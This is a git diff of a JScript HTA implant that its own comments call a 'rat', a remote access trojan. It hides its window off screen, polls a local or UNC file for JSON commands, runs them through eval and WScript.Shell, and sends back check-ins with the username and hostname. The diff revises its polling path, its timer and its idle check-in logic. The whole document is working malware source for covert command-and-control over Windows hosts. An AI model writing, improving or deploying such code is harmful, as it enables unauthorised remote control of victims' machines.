@@ -5,7 +5,7 @@ window.blur();
 window.resizeTo(6, 9);
 
 //Define variables
-var home = 'C:\\users\\kclark\\desktop\\test5.txt' // UNC or local path. Send and receive data through this file
+var home = 'C:\\users\\kclark\\test99.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
@@ -149,12 +149,16 @@ fdw.WriteLine(checkin) // write checkin for the first time
 fdw.close()
 
 function main() {
+  window.setTimeout("main()", sleepytime, "JScript")
   try {
     window.moveTo(-69, -420);
 
     var retval = ""
-    var serverMsg = smb_post(home, checkin);
-    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0] // pull out json from http msg
+    var recv_package = false
+    var jsondata = smb_post(home, checkin);
+    if(!jsondata) { // if no message from upstream rat, just wait and try again
+      return
+    }
     // Convert json string to json object
     eval("jsObject="+jsondata);
     checkin = '{ "p":[ ' // start building json response string
@@ -174,6 +178,7 @@ function main() {
     var packages = jsObject.p
     for(var p in packages) {
       if(packages[p].id == id) { // if this is our package (id = our id)
+        recv_package = true
         if(packages[p].cmnd) {
           var rettype = "retval"
           var cmnd = packages[p].cmnd
@@ -290,11 +295,13 @@ function main() {
         }
       }
     }
+    if(!recv_package) {
+      checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }';
+    }
   }
   catch (e) {
     checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
   }
-  window.setTimeout("main()", sleepytime, "JScript")
 }
 main()
 </script>
